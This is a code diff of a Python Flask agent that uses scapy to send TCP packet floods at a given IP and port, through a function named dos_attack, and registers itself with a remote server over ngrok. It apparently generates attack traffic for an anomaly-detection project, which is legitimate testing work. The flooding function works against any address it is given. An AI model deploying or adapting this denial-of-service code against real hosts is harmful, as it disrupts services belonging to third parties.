@@ -1,7 +1,6 @@
 from scapy.all import IP, TCP, send
 from flask import Flask, request, jsonify
 import threading, time, uuid
-import random
 
 app = Flask(__name__)
 
@@ -12,7 +11,7 @@ active_attacks = {}
 # -------------------------------
 import requests
 
-RENDER_URL = "https://realtime-anomaly-detection.onrender.com"
+RENDER_URL = "https://your-render-app.onrender.com"
 
 def register_with_server(ngrok_url):
     try:
@@ -38,10 +37,7 @@ def get_ngrok_url():
     return None
 
 def dos_attack(attack_id, target_ip, target_port, duration, rate):
-    packet = IP(dst=target_ip)/TCP(
-    dport=target_port,
-    sport=random.randint(1024, 65535)
-)
+    packet = IP(dst=target_ip)/TCP(dport=target_port)
     interval = 1 / rate
     end_time = time.time() + duration
     sent = 0
